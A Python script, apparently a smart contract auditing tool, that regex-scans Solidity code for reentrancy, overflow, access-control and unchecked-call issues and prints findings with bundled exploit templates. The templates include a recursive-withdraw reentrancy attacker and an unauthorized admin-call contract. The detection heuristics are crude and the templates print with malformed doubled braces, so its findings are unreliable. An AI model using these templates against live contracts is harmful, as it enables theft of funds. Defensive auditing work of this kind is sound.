#!/usr/bin/env python3
import re
import json
import ast
import subprocess
import os
from pathlib import Path
from typing import List, Dict, Any
import argparse

class SmartContractAuditor:
    def __init__(self):
        self.vulnerabilities = []
        self.severity_levels = {
            'CRITICAL': 4,
            'HIGH': 3,
            'MEDIUM': 2,
            'LOW': 1,
            'INFO': 0
        }
        
        # Common vulnerability patterns
        self.patterns = {
            'reentrancy': [
                r'\.call\.value\(.*\)\(\)',
                r'\.send\(.*\)',
                r'\.transfer\(.*\)',
                r'callcode\(.*\)',
                r'delegatecall\(.*\)'
            ],
            'integer_overflow': [
                r'(\+\+|\-\-)',
                r'(\w+)\s*[\+\-\*\/]\=',
                r'uint\d*\s+\w+\s*\=.*[\+\-\*\/]',
                r'SafeMath'  # Absence of SafeMath
            ],
            'access_control': [
                r'public\s+\w+\([^)]*\)',
                r'external\s+\w+\([^)]*\)',
                r'onlyOwner',
                r'require\(msg.sender',
                r'modifier'
            ],
            'unchecked_calls': [
                r'\.call\([^)]*\)\;',
                r'\.send\([^)]*\)\;',
                r'\.transfer\([^)]*\)\;'
            ]
        }
    
    def load_contract(self, file_path: str) -> str:
        """Load smart contract source code"""
        try:
            with open(file_path, 'r') as f:
                return f.read()
        except Exception as e:
            print(f"Error loading contract: {e}")
            return ""
    
    def parse_solidity_ast(self, contract_code: str) -> Dict[str, Any]:
        """Parse Solidity code and extract structural information"""
        ast_info = {
            'functions': [],
            'modifiers': [],
            'state_variables': [],
            'inheritance': [],
            'imports': []
        }
        
        # Extract function definitions
        function_pattern = r'function\s+(\w+)\s*\(([^)]*)\)\s*(?:public|private|internal|external)?\s*(?:view|pure)?\s*(?:returns\s*\([^)]*\))?\s*\{'
        functions = re.finditer(function_pattern, contract_code)
        for match in functions:
            ast_info['functions'].append({
                'name': match.group(1),
                'params': match.group(2),
                'visibility': self.get_function_visibility(match.group(0))
            })
        
        # Extract modifiers
        modifier_pattern = r'modifier\s+(\w+)\s*\([^)]*\)\s*\{[^}]*\}'
        modifiers = re.finditer(modifier_pattern, contract_code)
        for match in modifiers:
            ast_info['modifiers'].append(match.group(1))
        
        # Extract state variables
        state_var_pattern = r'(uint|int|address|bool|string|mapping)\s+(?:public|private)?\s*(\w+)\s*\;'
        state_vars = re.finditer(state_var_pattern, contract_code)
        for match in state_vars:
            ast_info['state_variables'].append({
                'type': match.group(1),
                'name': match.group(2)
            })
        
        return ast_info
    
    def get_function_visibility(self, function_declaration: str) -> str:
        """Extract function visibility"""
        if 'public' in function_declaration:
            return 'public'
        elif 'private' in function_declaration:
            return 'private'
        elif 'internal' in function_declaration:
            return 'internal'
        elif 'external' in function_declaration:
            return 'external'
        return 'public'  # Default
    
    def detect_reentrancy(self, contract_code: str, ast_info: Dict) -> List[Dict]:
        """Detect reentrancy vulnerabilities"""
        vulnerabilities = []
        
        # Pattern-based detection
        for pattern in self.patterns['reentrancy']:
            matches = re.finditer(pattern, contract_code)
            for match in matches:
                line_num = contract_code[:match.start()].count('\n') + 1
                vulnerabilities.append({
                    'type': 'REENTRANCY',
                    'severity': 'HIGH',
                    'line': line_num,
                    'description': f'Potential reentrancy vulnerability detected: {match.group(0)}',
                    'exploit': 'Attackers can recursively call functions before state updates'
                })
        
        # Advanced analysis: check state changes after external calls
        external_call_pattern = r'\.(call|send|transfer|callcode|delegatecall)\([^)]*\)'
        state_change_pattern = r'(\w+)\s*=\s*[^;]*(;|\n)'
        
        lines = contract_code.split('\n')
        for i, line in enumerate(lines):
            if re.search(external_call_pattern, line):
                # Check if state changes happen after this line
                for j in range(i + 1, min(i + 10, len(lines))):
                    if re.search(state_change_pattern, lines[j]):
                        vulnerabilities.append({
                            'type': 'REENTRANCY',
                            'severity': 'CRITICAL',
                            'line': i + 1,
                            'description': f'External call followed by state change at line {j + 1}',
                            'exploit': 'State should be updated before external calls (Checks-Effects-Interactions pattern)'
                        })
                        break
        
        return vulnerabilities
    
    def detect_integer_overflow(self, contract_code: str, ast_info: Dict) -> List[Dict]:
        """Detect integer overflow/underflow vulnerabilities"""
        vulnerabilities = []
        
        # Check for SafeMath usage
        if 'SafeMath' not in contract_code:
            vulnerabilities.append({
                'type': 'NO_SAFEMATH',
                'severity': 'MEDIUM',
                'line': 1,
                'description': 'SafeMath library not detected in contract',
                'exploit': 'Arithmetic operations may be vulnerable to overflows/underflows'
            })
        
        # Pattern-based detection of arithmetic operations
        arithmetic_patterns = [
            (r'(\w+)\s*\+\s*(\w+)', 'Addition overflow'),
            (r'(\w+)\s*\-\s*(\w+)', 'Subtraction underflow'),
            (r'(\w+)\s*\*\s*(\w+)', 'Multiplication overflow'),
            (r'(\w+)\s*\/\s*(\w+)', 'Division by zero')
        ]
        
        lines = contract_code.split('\n')
        for i, line in enumerate(lines):
            for pattern, description in arithmetic_patterns:
                if re.search(pattern, line) and 'SafeMath' not in line:
                    vulnerabilities.append({
                        'type': 'ARITHMETIC_ISSUE',
                        'severity': 'HIGH',
                        'line': i + 1,
                        'description': f'{description} detected: {line.strip()}',
                        'exploit': 'Use SafeMath for arithmetic operations'
                    })
        
        return vulnerabilities
    
    def detect_access_control(self, contract_code: str, ast_info: Dict) -> List[Dict]:
        """Detect access control vulnerabilities"""
        vulnerabilities = []
        
        # Check for public/external functions without access controls
        for function in ast_info['functions']:
            if function['visibility'] in ['public', 'external']:
                func_pattern = rf'function\s+{function["name"]}\s*\([^)]*\)\s*(?:public|external)[^{{]*{{'
                func_match = re.search(func_pattern, contract_code)
                
                if func_match:
                    func_start = func_match.start()
                    func_body = contract_code[func_start:func_start + 500]  # First 500 chars of function
                    
                    # Check for access control modifiers
                    access_controls = ['onlyOwner', 'require', 'assert', 'modifier']
                    has_control = any(control in func_body for control in access_controls)
                    
                    if not has_control and function['name'] not in ['constructor', 'fallback']:
                        line_num = contract_code[:func_start].count('\n') + 1
                        vulnerabilities.append({
                            'type': 'ACCESS_CONTROL',
                            'severity': 'MEDIUM',
                            'line': line_num,
                            'description': f'Function {function["name"]} is public/external without access controls',
                            'exploit': 'Unauthorized users may call sensitive functions'
                        })
        
        return vulnerabilities
    
    def detect_unchecked_calls(self, contract_code: str, ast_info: Dict) -> List[Dict]:
        """Detect unchecked low-level calls"""
        vulnerabilities = []
        
        call_patterns = [
            (r'\.call\([^)]*\)\;', 'call'),
            (r'\.send\([^)]*\)\;', 'send'),
            (r'\.transfer\([^)]*\)\;', 'transfer')
        ]
        
        lines = contract_code.split('\n')
        for i, line in enumerate(lines):
            for pattern, call_type in call_patterns:
                if re.search(pattern, line):
                    # Check if return value is checked
                    if call_type in ['call', 'send'] and 'require' not in line and 'if' not in line:
                        vulnerabilities.append({
                            'type': 'UNCHECKED_CALL',
                            'severity': 'MEDIUM',
                            'line': i + 1,
                            'description': f'Unchecked low-level {call_type} detected',
                            'exploit': 'Always check return value of low-level calls'
                        })
        
        return vulnerabilities
    
    def generate_exploit_poc(self, vulnerability: Dict, contract_code: str) -> str:
        """Generate proof-of-concept exploit code"""
        exploit_templates = {
            'REENTRANCY': '''
// Reentrancy Exploit Contract
contract ReentrancyExploit {{
    address vulnerableContract;
    uint public attackCount = 0;
    
    constructor(address _target) {{
        vulnerableContract = _target;
    }}
    
    function attack() public payable {{
        // Call vulnerable function recursively
        (bool success, ) = vulnerableContract.call{{value: msg.value}}(
            abi.encodeWithSignature("withdraw(uint256)", msg.value)
        );
        require(success, "Attack failed");
    }}
    
    fallback() external payable {{
        if (attackCount < 10) {{
            attackCount++;
            // Re-enter the vulnerable function
            (bool success, ) = vulnerableContract.call(
                abi.encodeWithSignature("withdraw(uint256)", msg.value)
            );
        }}
    }}
}}
''',
            'ARITHMETIC_ISSUE': '''
// Integer Overflow Exploit
contract OverflowExploit {{
    function causeOverflow() public pure returns (uint) {{
        uint max = 2**256 - 1;
        return max + 1; // This will overflow to 0
    }}
    
    function causeUnderflow() public pure returns (uint) {{
        uint min = 0;
        return min - 1; // This will underflow to max uint
    }}
}}
''',
            'ACCESS_CONTROL': '''
// Access Control Bypass
contract AccessControlExploit {{
    address target;
    
    constructor(address _target) {{
        target = _target;
    }}
    
    function exploitSensitiveFunction() public {{
        // Directly call function that should be restricted
        (bool success, ) = target.call(
            abi.encodeWithSignature("adminFunction()")
        );
        require(success, "Exploit failed");
    }}
}}
'''
        }
        
        return exploit_templates.get(vulnerability['type'], '// No exploit template available')
    
    def analyze_contract(self, file_path: str) -> Dict[str, Any]:
        """Main analysis function"""
        print(f"[*] Analyzing contract: {file_path}")
        
        contract_code = self.load_contract(file_path)
        if not contract_code:
            return {'error': 'Could not load contract'}
        
        ast_info = self.parse_solidity_ast(contract_code)
        
        # Run all detection modules
        self.vulnerabilities.extend(self.detect_reentrancy(contract_code, ast_info))
        self.vulnerabilities.extend(self.detect_integer_overflow(contract_code, ast_info))
        self.vulnerabilities.extend(self.detect_access_control(contract_code, ast_info))
        self.vulnerabilities.extend(self.detect_unchecked_calls(contract_code, ast_info))
        
        # Sort by severity
        self.vulnerabilities.sort(key=lambda x: self.severity_levels[x['severity']], reverse=True)
        
        return {
            'file': file_path,
            'ast_info': ast_info,
            'vulnerabilities': self.vulnerabilities,
            'summary': {
                'total_vulnerabilities': len(self.vulnerabilities),
                'critical': len([v for v in self.vulnerabilities if v['severity'] == 'CRITICAL']),
                'high': len([v for v in self.vulnerabilities if v['severity'] == 'HIGH']),
                'medium': len([v for v in self.vulnerabilities if v['severity'] == 'MEDIUM']),
                'low': len([v for v in self.vulnerabilities if v['severity'] == 'LOW'])
            }
        }
    
    def generate_report(self, analysis_result: Dict[str, Any]):
        """Generate comprehensive security report"""
        print("\n" + "="*80)
        print("SMART CONTRACT SECURITY AUDIT REPORT")
        print("="*80)
        
        print(f"\nTarget: {analysis_result['file']}")
        print(f"Total Vulnerabilities: {analysis_result['summary']['total_vulnerabilities']}")
        print(f"Critical: {analysis_result['summary']['critical']}")
        print(f"High: {analysis_result['summary']['high']}")
        print(f"Medium: {analysis_result['summary']['medium']}")
        print(f"Low: {analysis_result['summary']['low']}")
        
        print("\nDETAILED FINDINGS:")
        print("-"*80)
        
        for vuln in analysis_result['vulnerabilities']:
            print(f"\n[{vuln['severity']}] {vuln['type']}")
            print(f"Line {vuln['line']}: {vuln['description']}")
            print(f"Exploit: {vuln['exploit']}")
            
            # Generate PoC for critical/high vulnerabilities
            if vuln['severity'] in ['CRITICAL', 'HIGH']:
                poc = self.generate_exploit_poc(vuln, "")
                print(f"\nProof of Concept:\n{poc}")
        
        print("\n" + "="*80)
        print("AUDIT COMPLETE")
        print("="*80)

def main():
    parser = argparse.ArgumentParser(description='Smart Contract Security Auditor')
    parser.add_argument('contract_file', help='Path to Solidity contract file')
    parser.add_argument('--output', '-o', help='Output report file')
    
    args = parser.parse_args()
    
    auditor = SmartContractAuditor()
    result = auditor.analyze_contract(args.contract_file)
    
    if 'error' not in result:
        auditor.generate_report(result)
        
        # Save detailed report if output specified
        if args.output:
            with open(args.output, 'w') as f:
                json.dump(result, f, indent=2)
            print(f"\nDetailed report saved to: {args.output}")

if __name__ == "__main__":
    main()
